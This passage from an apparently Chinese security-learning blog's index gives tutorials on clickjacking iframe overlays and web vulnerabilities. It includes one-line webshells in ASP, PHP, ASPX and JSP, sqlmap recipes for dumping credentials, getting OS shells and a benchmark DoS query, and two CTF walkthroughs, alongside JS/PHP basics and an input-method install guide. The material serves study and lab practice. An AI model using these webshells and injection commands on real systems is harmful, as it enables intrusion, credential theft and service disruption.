    <content type="text"><![CDATA[一、前置知识首先介绍下html下的iframe标签的作用：可以创建包含另一个文档的内联框架。例如下面这个代码。运行下面这个网页，发现他和网易安全中心的页面几乎一样，除了url不一样 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt; &lt;head&gt; &lt;title&gt;网易安全中心&lt;/title&gt; &lt;style &gt; html,body,iframe{ display: block; height: 100%; width: 100%; margin: 0; padding: 0; border: none; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;iframe src=&quot;http://aq.163.com/module/hole/hole-submit.html&quot;&gt;&lt;/iframe&gt; &lt;/body&gt; &lt;/html&gt; 案例，图片的背后是隐藏的网站。 二、什么是点击劫持呢通过覆盖不可见的框架误导受害者点击而造成的攻击行为。 三、点击劫持的特点1、隐蔽性高 2、骗取用户操作 3、UI-覆盖攻击 4、利用了iframe标签或者其他标签的属性 四、实例分析代码如下，效果如下 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt; &lt;head&gt; &lt;title&gt;点击劫持&lt;/title&gt; &lt;style &gt; /*设置高度、宽度*/ html,body,iframe{ display: block; height: 100%; width: 100%; margin: 0; padding: 0; border: none; } /*设置隐藏网页的可见度*/ iframe{ /*opacity: 0;*/ filter: alpha(opacity=0);/*IE*/ -moz-opacity:0.5;/*Moz+FF*/ opacity: 0.5;/*支持css3浏览器（FF1.5也支持）*/ position: absolute; z-index: 2;/*网页的堆叠层次*/ } /*设置按钮的位置*/ button{ position: absolute; top: -70px; left: 800px; z-index: 1; width: 72px; height: 26px; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;button&gt;&lt;img src=&quot;3.jpg&quot;&gt;&lt;/button&gt; &lt;iframe src=&quot;http://aq.163.com/module/hole/hole-submit.html&quot;&gt;&lt;/iframe&gt; &lt;/body&gt; &lt;/html&gt; 再做次修改效果，以及完全看不出背后的网易网页了。]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[URL跳转、命令注入、文件操作类漏洞介绍]]></title>
    <url>%2F2019%2F03%2F06%2FURL%2F</url>
    <content type="text"><![CDATA[一、什么是URL跳转漏洞呢借助未验证的URL跳转，将应用程序引导到不安全的第三方区域，从而导致的安全问题。 二、实现方式1、Header头跳转实现代码2、javascript跳转实现代码3、meta跳转 三、原理分析 四、什么是命令注入系统命令注入 五、web应用如何注入命令PHP执行命令的注入例如分析攻击过程 六、常见的文件操作 七、常见的文件操作漏洞1、文件上传漏洞2、任意文件下载漏洞3、文件包含漏洞文件包含漏洞包括本地文件包含和远程文件包含]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[browser]]></title>
    <url>%2F2019%2F03%2F06%2Fbrowser%2F</url>
    <content type="text"><![CDATA[·浏览器安全性特性 一、介绍chrome浏览器1、如何修改安全设置？常规设置步骤快捷设置步骤2、如何清除缓存3、每一次都去清除缓存太麻烦了，可以使用隐身模式（无痕模式） 在功能菜单中选择新建无痕窗口即可3、如何查看网页源代码呢？4、如何查看DOM元素？F12直接打开下面的开发者工具栏5、如何查看网络数据包 二、介绍火狐浏览器火狐浏览器有个强大的插件库1、如何修改安全设置 三、介绍IE浏览器如何修改安全设置]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>browser</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[脚本木马的制作与原理(主要介绍一句话木马)]]></title>
    <url>%2F2019%2F03%2F03%2Fmuma%2F</url>
    <content type="text"><![CDATA[webshell（web后门）一、一句话木马短小精悍，功能强大，隐蔽性好。 &lt;% execute request(&quot;value&quot;) %&gt; 说明：使用request的话，post和get两中方式传来的数据都可以接受。 execute用来执行客户端传来的数据。 代码本身没有危害，关键在于我们传输的数据是什么。 常见写法asp一句话木马 &lt;%eval request(&quot;c&quot;)%&gt; php一句话木马 &lt;?php @eval($_POST[‘value’]);?&gt; aspx一句话木马 &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.ltem[&quot;value&quot;])%&gt; jsp一句话木马 &lt; % if(request.getParametere(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;/&quot;)+request.getParameter(&quot;f&quot;)))write(request.getParameter(&quot;t&quot;).getBytes());% &gt; 利用中国菜刀进行连接这边我用phpstudy做演示，需要把一句话木马文件放在网站根目录。一句话木马内容为 &lt;?php @eval($_REQUEST[&apos;xx&apos;]); ?&gt; 可以手动获取信息我们把一句话木马内容改成 &lt;?php @system($_REQUEST[&apos;xx&apos;]); ?&gt; 这样可以执行系统命令。注意再次使用中国菜刀连接其他链接之前，需要重置下缓存。在浏览器输入 http://localhost/123.php?xx=ipconfig 执行系统命令 图片木马的制作上传到服务器后不能直接执行，得想办法改成脚本格式或者在特定环境下以脚本运行 一句话使用技巧 二、小马、大马还有其他木马，如打包马、脱裤马等等]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript基础]]></title>
    <url>%2F2019%2F03%2F03%2Fjs%2F</url>
    <content type="text"><![CDATA[一、概述JavaScript 是互联网上最受欢迎的编程语言之一，用于为网页添加交互性，处理数据，以及创建各种应用程序（移动应用程序，桌面应用程序，游戏等）,这门语言可用于 HTML 和 web，更可广泛用于服务器、PC、笔记本电脑、平板电脑和智能手机等设备。 二、用法在html中必须写在&lt;script&gt;&lt;/script&gt;中写入js代码。在网页中通常通过head和body增加javascript。 二、基础语法1、javaScript的输出 使用doument.write()方法将内容写到html页面中如： &lt;script&gt;document.write(&quot;hhhh&quot;) &lt;/script&gt; 2、window.alter()弹出警告框 &lt;script&gt;window.alter(&quot;hhhh&quot;) &lt;/script&gt; 3、用innerHTML写入到html元素中 demoP.innerHTML=&quot;a=&quot;+a+&quot;,b=&quot;+b; 4、使用console.log（）写入到浏览器的控制台。 5、document.getElementById(“demo”) 是使用 id 属性来查找 HTML 元素的 JavaScript 代码 。 6、 innerHTML = “Paragraph changed.” 是用于修改元素的 HTML 内容(innerHTML)的 JavaScript 代码。 7、格式化文本使用html标签来格式化javascript中的文本如： &lt;script&gt; document.write(&quot;&lt;h1&gt;hello world&lt;/h1&gt;&quot;); &lt;/script&gt; 8、&lt; script &gt;标签language和type两个属性，指定脚本类型 &lt;script language=&quot;JavaScript&quot; type=&quot;text/javascript&quot;&gt; &lt;/script&gt; 9、外部javascript在多个不同网页中使用相同的代码时，外部脚本是很实用的，javascript文件的文件后缀是.js。要使用外部脚本，将脚本文件的名称放在&lt; script &gt;标签的src属性中。 &lt; script src=&quot;index.js&quot;&gt;&lt; /script &gt; 注意：外部脚本不能使用&lt; script&gt;标签包裹，可以在&lt; head&gt;或&lt; body&gt;中放置外部脚本引用，将javascript放在外部文件中具有以下优点：（1）分离html和代码。（2）使html和javascript更容易阅读和维护。（3）缓存的javascript文件可以加快页面加载速度。 10、js变量声明用var来声明变量，注意js是区分大小写的 var x=5 变量命名的规则：a.变量必须以字母开头。b.变量也能以$和_符号开头（不推荐）。c.大小写不一样。d.变量名称不能包含空格。 11、基本数据类型只有一种数字类型，可以带小数，也可以不带。可以使用科学记数法来书写 var y = 123e5 ;//&lt;!--12300000--&gt; var y = 123e-5 ;//&lt;!--0.00123--&gt; 字符串，用单引号、双引号都可以 var pangzi = &quot;yang xiao pang&quot; ; var pangzi = &apos;yang xiao pang&apos; ; 但如果想在引号中再使用引号，须使用“\”转意处理引号中的引号。（如果引号类型不同则不用） var p= &quot;y \&quot;xiao p\&quot;&quot; ; var p = &apos;y \&apos;xiao p\&apos;&apos; ; 12、布尔：当值为0，null，undefined，空字符串时，布尔值为false。任何拥有值的字符串其布尔值为true。 13、数组 &lt;script&gt; var fatty = new Array(); fatty[0] = &quot;杨小胖&quot;; fatty[1] = &quot;景小胖&quot;; document.write(fatty); &lt;/script&gt; 或 &lt;script&gt; var fatty = new Array(&quot;杨小胖&quot;,&quot;景小胖&quot;); document.write(fatty); &lt;/script&gt; 14、复杂数据类型**对象 var fatty = {firstname = &quot;yang&quot;,lastname=&quot;yi&quot; ,id:1209｝; 对象的两种寻址方式： name = person.lastname; name = person[&quot;lasrname&quot;]; 声明变量类型：用new声明 var fatty = new String; 注意javascript变量均为对象，当声明一个变量时，就创建了一个新的对象。]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmap常见的11种方法]]></title>
    <url>%2F2019%2F03%2F03%2Fsqlmap2%2F</url>
    <content type="text"><![CDATA[本文转载https://www.cnblogs.com/ichunqiu/p/5805108.html这篇文章一共有11种常见SQLmap使用方法： 一、SQLMAP用于Access数据库注入 (1) 猜解是否能注入12 win: python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; Linux : .lmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; (2) 猜解表 12 win: python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --tables Linux: .lmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --tables (3) 根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表) 12 win: python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --columns -T admin Linux: .lmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --columns -T admin (4) 根据字段猜解内容(假如通过3得到字段为username和password) 123 win: python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --dump -T admin -C &quot;username,password&quot; Linux: .lmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --dump -T admin -C &quot;username,[url=]B[/url]password&quot; 二、SQLMAP用于Cookie注入 (1) cookie注入，猜解表 1 win : python sqlmap.py -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --table --level 2 (2) 猜解字段，(通过1的表猜解字段，假如表为admin) 12 win :python sqlmap.py -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --columns -T admin --level 2 (3) 猜解内容 12 win :python sqlmap.py -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --dump -T admin -C &quot;username,password&quot; --level 2 三、SQLMAP用于mysql中DDOS攻击(1) 获取一个Shell 1234 win: python sqlmap.py -u [url]http://192.168.159.1/news.php?id=1[/url] --sql-shell Linux: sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --sql-shell (2) 输入执行语句完成DDOS攻击 1 select benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f) 四、SQLMAP用于mysql注入 (1) 查找数据库 1 python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; --dbs (2) 通过第一步的数据库查找表(假如数据库名为dataname) 1 python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname --tables (3) 通过2中的表得出列名(假如表为table_name) 1 python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname -T table_name --columns (4) 获取字段的值(假如扫描出id,user,password字段) 12 python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname -T table_name -C &quot;id,user,password&quot; --dump 五、SQLMAP中post登陆框注入 (1) 其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件我们在使用Sqlmap进行post型注入时，经常会出现请求遗漏导致注入失败的情况。这里分享一个小技巧，即结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。 浏览器打开目标地址http:// www.xxx.com /Login.asp 配置burp代理(127.0.0.1:8080)以拦截请求 点击login表单的submit按钮 这时候Burp会拦截到了我们的登录POST请求 把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下 运行sqlmap并使用如下命令： 1./sqlmap.py -r search-test.txt -p tfUPass 这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。 注入点：http://testasp.vulnweb.com/Login.asp 几种注入方式：./sqlmap.py -r search-test.txt -p tfUPass (2) 自动的搜索 1sqlmap -u [url]http://testasp.vulnweb.com/Login.asp[/url] –forms (3) 指定参数搜索 1sqlmap -u [url]http://testasp.vulnweb.com/Login.asp[/url] –data “tfUName=321&amp;tfUPass=321” 六、SQLMAP中Google搜索注入 inurl后面的语言是由自己定的 注入过程中如果选y是注入，如果不是选n 1sqlmap -g inurl:php?id= 七、SQLMAP中的请求延迟参数 –delay –safe-freq 12python sqlmap.py –dbs -u “http://xxx.cn/index.php/Index/view/id/40.html&quot; –delay 1python sqlmap.py –dbs -u “http://xxx.cn/index.php/Index/view/id/40.html&quot; –safe-freq 3 参数 八、SQLMAP绕过WAF防火墙注入点:http://192.168.159.1/news.php?id=1 1sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] -v 3 –dbs –batch –tamper “space2morehash.py” space2morehash.py中可以替换space2hash.py或者base64encode.py或者charencode.py 都是编码方式 space2hash.py base64encode.py charencode.py 九、SQLMAP查看权限 1sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] –privileges 十、SQLMAP伪静态注入(1) 查找数据库 1python sqlmap.py -u “http://xxx.cn/index.php/Index/view/id/40.html&quot; –dbs (2) 通过1中的数据库查找对应的表 (假如通过1，得到的是dataname) 1python sqlmap.py -u “http://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname –tables (3) 通过2中的数据表得到字段(假如得到的是tablename表) 12python sqlmap.py -u “http://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname -Ttablename –columns (4) 通过3得到字段值(假如从3中得到字段id，password) 12python sqlmap.py -u “http://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname -Ttablename -C “password” –dump 十一、SQLMAP注入点执行命令与交互写shell (1) 注入点：http://192.168.159.1/news.php?id=1 此处采用的是Linux系统 1sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] –os-cmd=ipconfig 出现语言的选择根据实际的测试网站选择语言 指定目标站点D:/www/ (2) 获取Shell 1sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] –os-shell 出现语言的选择根据实际的测试网站选择语言 指定目标站点D:/www/ 输入ipconfig/all 创建用户和删除用户 只要权限足够大，你可以输入使用任何命令。 其他命令参考下面： 从数据库中搜索字段 1sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password 在dedecms数据库中搜索字段admin或者password。 读取与写入文件 首先找需要网站的物理路径，其次需要有可写或可读权限。 –file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径） –file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell） –file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径 #示例： 1sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php” 使用shell命令： 1sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell 接下来指定网站可写目录： “E:\php\htdocs\dvwa” #注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数） sqlmap详细命令： -is-dba 当前用户权限（是否为root权限） -dbs 所有数据库 -current-db 网站当前数据库 -users 所有数据库用户 -current-user 当前数据库用户 -random-agent 构造随机user-agent -passwords 数据库密码 -proxy http://local:8080 –threads 10 (可以自定义线程加速) 代理 -time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒） Options（选项）：-version 显示程序的版本号并退出-h, –help 显示此帮助消息并退出-v VERBOSE 详细级别：0-6（默认为1） Target（目标）： 以下至少需要设置其中一个选项，设置目标URL。 -d DIRECT 直接连接到数据库。-u URL, –url=URL 目标URL。-l LIST 从Burp或WebScarab代理的日志中解析目标。-r REQUESTFILE 从一个文件中载入HTTP请求。-g GOOGLEDORK 处理Google dork的结果作为目标URL。-c CONFIGFILE 从INI配置文件中加载选项。 Request（请求）： 这些选项可以用来指定如何连接到目标URL。 -data=DATA 通过POST发送的数据字符串-cookie=COOKIE HTTP Cookie头-cookie-urlencode URL 编码生成的cookie注入-drop-set-cookie 忽略响应的Set – Cookie头信息-user-agent=AGENT 指定 HTTP User – Agent头-random-agent 使用随机选定的HTTP User – Agent头-referer=REFERER 指定 HTTP Referer头-headers=HEADERS 换行分开，加入其他的HTTP头-auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)-auth-cred=ACRED HTTP身份验证凭据（用户名:密码）-auth-cert=ACERT HTTP认证证书（key_file，cert_file）-proxy=PROXY 使用HTTP代理连接到目标URL-proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）-ignore-proxy 忽略系统默认的HTTP代理-delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒-timeout=TIMEOUT 等待连接超时的时间（默认为30秒）-retries=RETRIES 连接超时后重新连接的时间（默认3）-scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式-safe-url=SAFURL 在测试过程中经常访问的url地址-safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL Enumeration（枚举）：这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。 -b, –banner 检索数据库管理系统的标识-current-user 检索数据库管理系统当前用户-current-db 检索数据库管理系统当前数据库-is-dba 检测DBMS当前用户是否DBA-users 枚举数据库管理系统用户-passwords 枚举数据库管理系统用户密码哈希-privileges 枚举数据库管理系统用户的权限-roles 枚举数据库管理系统用户的角色-dbs 枚举数据库管理系统数据库-D DBname 要进行枚举的指定数据库名-T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns）-tables 枚举的DBMS数据库中的表-columns 枚举DBMS数据库表列-dump 转储数据库管理系统的数据库中的表项-dump-all 转储所有的DBMS数据库表中的条目-search 搜索列（S），表（S）和/或数据库名称（S）-C COL 要进行枚举的数据库列-U USER 用来进行枚举的数据库用户-exclude-sysdbs 枚举表时排除系统数据库-start=LIMITSTART 第一个查询输出进入检索-stop=LIMITSTOP 最后查询的输出进入检索-first=FIRSTCHAR 第一个查询输出字的字符检索-last=LASTCHAR 最后查询的输出字字符检索-sql-query=QUERY 要执行的SQL语句-sql-shell 提示交互式SQL的shell Optimization（优化）：这些选项可用于优化SqlMap的性能。 -o 开启所有优化开关–predict-output 预测常见的查询输出–keep-alive 使用持久的HTTP（S）连接–null-connection 从没有实际的HTTP响应体中检索页面长度–threads=THREADS 最大的HTTP（S）请求并发量（默认为1） Injection（注入）：这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。 -p TESTPARAMETER 可测试的参数（S）–dbms=DBMS 强制后端的DBMS为此值–os=OS 强制后端的DBMS操作系统为这个值–prefix=PREFIX 注入payload字符串前缀–suffix=SUFFIX 注入payload字符串后缀–tamper=TAMPER 使用给定的脚本（S）篡改注入数据 Detection（检测）：这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。 –level=LEVEL 执行测试的等级（1-5，默认为1）–risk=RISK 执行测试的风险（0-3，默认为1）–string=STRING 查询时有效时在页面匹配字符串–regexp=REGEXP 查询时有效时在页面匹配正则表达式–text-only 仅基于在文本内容比较网页 Techniques（技巧）：这些选项可用于调整具体的SQL注入测试。 –technique=TECH SQL注入技术测试（默认BEUST）–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）–union-cols=UCOLS 定列范围用于测试UNION查询注入–union-char=UCHAR 用于暴力猜解列数的字符 Fingerprint（指纹）：-f, –fingerprint 执行检查广泛的DBMS版本指纹 Brute force（蛮力）：这些选项可以被用来运行蛮力检查。 –common-tables 检查存在共同表 –common-columns 检查存在共同列 User-defined function injection（用户自定义函数注入）： 这些选项可以用来创建用户自定义函数。 –udf-inject 注入用户自定义函数 –shared-lib=SHLIB 共享库的本地路径 File system access（访问文件系统）：这些选项可以被用来访问后端数据库管理系统的底层文件系统。 –file-read=RFILE 从后端的数据库管理系统文件系统读取文件–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径 Operating system access（操作系统访问）：这些选项可以用于访问后端数据库管理系统的底层操作系统。 –os-cmd=OSCMD 执行操作系统命令–os-shell 交互式的操作系统的shell–os-pwn 获取一个OOB shell，meterpreter或VNC–os-smbrelay 一键获取一个OOB shell，meterpreter或VNC–os-bof 存储过程缓冲区溢出利用–priv-esc 数据库进程用户权限提升–msf-path=MSFPATH Metasploit Framework本地的安装路径–tmp-path=TMPPATH 远程临时文件目录的绝对路径 Windows注册表访问：这些选项可以被用来访问后端数据库管理系统Windows注册表。 –reg-read 读一个Windows注册表项值–reg-add 写一个Windows注册表项值数据–reg-del 删除Windows注册表键值–reg-key=REGKEY Windows注册表键–reg-value=REGVAL Windows注册表项值–reg-data=REGDATA Windows注册表键值数据–reg-type=REGTYPE Windows注册表项值类型这些选项可以用来设置一些一般的工作参数。-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中-s SESSIONFILE 保存和恢复检索会话文件的所有数据–flush-session 刷新当前目标的会话文件–fresh-queries 忽略在会话文件中存储的查询结果–eta 显示每个输出的预计到达时间–update 更新SqlMap–save file保存选项到INI配置文件–batch 从不询问用户输入，使用所有默认配置。 Miscellaneous（杂项）：–beep 发现SQL注入时提醒–check-payload IDS对注入payloads的检测测试–cleanup SqlMap具体的UDF和表清理DBMS–forms 对目标URL的解析和测试形式–gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果–page-rank Google dork结果显示网页排名（PR）–parse-errors 从响应页面解析数据库管理系统的错误消息–replicate 复制转储的数据到一个sqlite3数据库–tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址–wizard 给初级用户的简单向导界面 相关链接：http://bbs.ichunqiu.com/thread-10583-1-1.html]]></content>
      <categories>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmap之cookie注入（靶场第二题）]]></title>
    <url>%2F2019%2F03%2F03%2Fsqlmap1%2F</url>
    <content type="text"><![CDATA[sqlmap靶场第二题：https://hack.zkaq.org/?a=battle&amp;f=target&amp;id=31ac789a52edf9bb首先我们尝试下sql注入 http://120.203.13.75:8001/shownews.asp?id=171%20and%201=1 说明该网站有防sql注入。那么我们使用cookie注入 http://120.203.13.75:8001/shownews.asp?id=171%20order%20by%2010 第一步猜解表 sqlmap -u &quot;http://120.203.13.75:8001/shownews.asp?&quot; --cookie &quot;id=171&quot; --table --level 2 第二步，猜字段 sqlmap -u &quot;http://120.203.13.75:8001/shownews.asp?&quot; --cookie &quot;id=171&quot; --column -T admin --level 2 第三步，爆数据 sqlmap -u &quot;http://120.203.13.75:8001/shownews.asp?&quot; --cookie &quot;id=171&quot; --dump -T admin -C &quot;username,password&quot; --level 2 b9a2a2b5dffb918c,该密码是md5加密，百度搜索md5在线加密我们已经拿到密码了进入后台网站,利用御剑工作扫出后台http://120.203.13.75:8001/admin输入账号admin,密码welcome获取flag]]></content>
      <categories>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmap安装与使用（实验吧第3题）]]></title>
    <url>%2F2019%2F03%2F03%2Fsqlmap0%2F</url>
    <content type="text"><![CDATA[使用的环境是Ubuntu系统 sqlmap的安装sqlmap需要安装python2环境,python3不行(Ubuntu下默认安装python2)输入命令：sudo apt sqlamp检查是否安装成功输入命令：sqlmap -help返回下面结果即为成功。 sqlmap基本参数sqlmap -h 查看帮助选项is -dba 当前用户权限dbs 所有数据库current-db 网站当前数据库users 所有数据库用户current-user 当前数据库用户tables 参数：列表名columns 参数：字段名dump 参数：下载数据 sqlmap牛刀小试我们以这到题为例http://www.shiyanbar.com/ctf/33。如果没有注册过实验吧的朋友先注册下实验吧拿到题目我们判断下有没有sql注入 在url后面加上and 1=1,没有报错 加上and 1=2，报错。 说明有sql注入 第一步使用sqlmap查看数据库信息输入命令：sqlmap -u &quot;http://ctf5.shiyanbar.com/8/index.php?id=1&quot; --current-db经过一些时间成功爆出当前数据库为my_db,如果注入过程提示选择y或者n，一般是选择y。大概就是尝试更多的方法进行注入第二步、爆出表名输入命令：sqlmap -u &quot;http://ctf5.shiyanbar.com/8/index.php?id=1&quot; -D my_db --tables 第三步爆字段名输入命令： sqlmap -u &quot;http://ctf5.shiyanbar.com/8/index.php?id=1&quot; -D my_db -T thiskey --columnsy 第四步、爆数据输入命令： sqlmap -u &quot;http://ctf5.shiyanbar.com/8/index.php?id=1&quot; -D my_db -T thiskey -C k0y --dump 稍等片刻，成功找到flag：whatiMyD91dump]]></content>
      <categories>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP strcmp（）函数 引入文件语句的区别 魔术方法]]></title>
    <url>%2F2019%2F02%2F28%2FPHP1%2F</url>
    <content type="text"><![CDATA[一、strcmp（）函数1、strcmp（）的作用是比较2个字符串（区分大小写）2、基本语法： stcmp(string1,string2)//string1和2进行比较 3、技术细节：如果返回值为0,2个字符串相等如果返回值小于0,string1小于string2如果返回值大于0,string1大于string2注意的是，PHP版本得为4+ 该函数与stncmop()函数类似，不同的是，stncmop()函数可以指定字符串用于比较的字符数基本语法： strncmp(string1,string2,length) 二、include() 、require()语句包含并运行指定文件。这两结构在包含文件上完全一样，唯一的区别是对于错误的处理。require()语句在遇到包含文件不存在，或是出错的时候，就停止即行，并报错。include()则继续即行。 include(‘hello.php’); echo ‘include test final!’;//include报错，但是会继续执行，显示：include test final! require(‘hello.php’); echo ‘require test final!’;//require报错，停止代码的执行。 二、include, include_once, require, require_once 的区别include 和 include_once 只有在 php 执行到该语句时才会执行文件包含的操作。其中，include在包含文件出错时会提示 warning, 但后续的代码仍会继续执行, iclude_once 不会重复包含同一文件;require 和 require_once 在php文件执行前就把需要包含的文件的内容替换掉 require 语句本身, 所以在包含文件出错时会抛出error, 后续代码不会继续执行, require_once 也只执行一次包含操作.下面这篇博客是教详细介绍了他们·的区别https://blog.csdn.net/j393819650/article/details/53836525 三、魔术方法具体的大家可以看php手册之魔术方法这边就只是简单介绍下他们何时会触发 1、__construct,构造函数，具有构造函数的类会在每次创建新对象时先调用此方法（实例化对象时） 2、__destruct,解析函数，析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。（类对象使用结束时自动调用） 3、属性重载在给不可访问（未定义）属性赋值时，__set() 会被调用。 读取不可访问（未定义）属性的值时，__get() 会被调用。 当对不可访问（未定义）属性调用 isset() 或 empty() 时，__isset() 会被调用。 当对不可访问（未定义）属性调用 unset() 时，__unset() 会被调用。注意的是：这些魔术方法的参数都不能通过引用传递 4、方法重载在对象中调用一个不可访问方法时，__call() 会被调用。 在静态上下文中调用一个不可访问方法时，__callStatic() 会被调用 5、__sleep(),serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作 6、 __wakeup ，与之相反，unserialize() 会检查是否存在一个 wakeup() 方法。如果存在，则会先调用 wakeup 方法，预先准备对象需要的资源。__wakeup() 经常用在反序列化操作中。 7、__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误 注意！！！！不能在 __toString() 方法中抛出异常。这么做会导致致命错误。 8、__invoke()当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。注意：在PHP5.3.0版本上才有效 9、 __set_state()，自 PHP 5.1.0 起当调用 var_export() 导出类时，此静态 方法会被调用。 10、__clone(),当使用__clone()复制一个对象时候调用。 11、__debugInfo ( ) :，在转储对象以获取应该显示的属性时，var_dump()调用此方法。如果方法没有在对象上定义，那么将显示所有公共、受保护和私有属性。]]></content>
      <categories>
        <category>PHP基础</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu系统安装搜狗输入法]]></title>
    <url>%2F2019%2F02%2F27%2Fpostname%2F</url>
    <content type="text"><![CDATA[ubuntu默认是字母，当然有中文输入法fcixtx(小企鹅输入法)，但是我不怎么喜欢用，接下来我们就来安装搜狗输入法下载命令全部在终端中执行 一、下载搜狗输入法的安装包​ 下载地址为：http://pinyin.sogou.com/linux/ 12下载命令wget &quot;http://cdn2.ime.sogou.com/dl/index/1524572264/sogoupinyin_2.2.0.0108_amd64.deb?st=tQdHKEaxh6PcyFVf4QfT1A&amp;e=1539855246&amp;fn=sogoupinyin_2.2.0.0108_amd64.deb&quot; 注意：要选择与自己系统相对应的安装包，我的系统是ubuntu64位，所以我下载64位的安装包 二、查看是否下载成功输入命令ls -l 三、安装搜狗输入法安装包1sudo dpkg -i sogoupinyin_2.2.0.0082_amd64.deb//-i后面为我们下载的安装包的文件名 四、选择fcitx输入法从系统设置里面点击“语言支持”，从语言支持里面选择小企鹅输入法（fcitx），默认为ibus，搜狗输入要安装在fcitx输入法上面。你可能会打不开“语言支持”，只需执行命令sudo apt-get install -f 即可修复错误，打开语音支持 如果没有小企鹅输入法的话执行以下命令 12sudo apt-get updatesudo apt-get upgrade 1、重启（可以使用命令reboot）然后在系统设置中选择 fcitx configure,然后按下图操作 六、安装中文语言操作如下图等他下载完成后最后重启，大功告成]]></content>
  </entry>
</search>
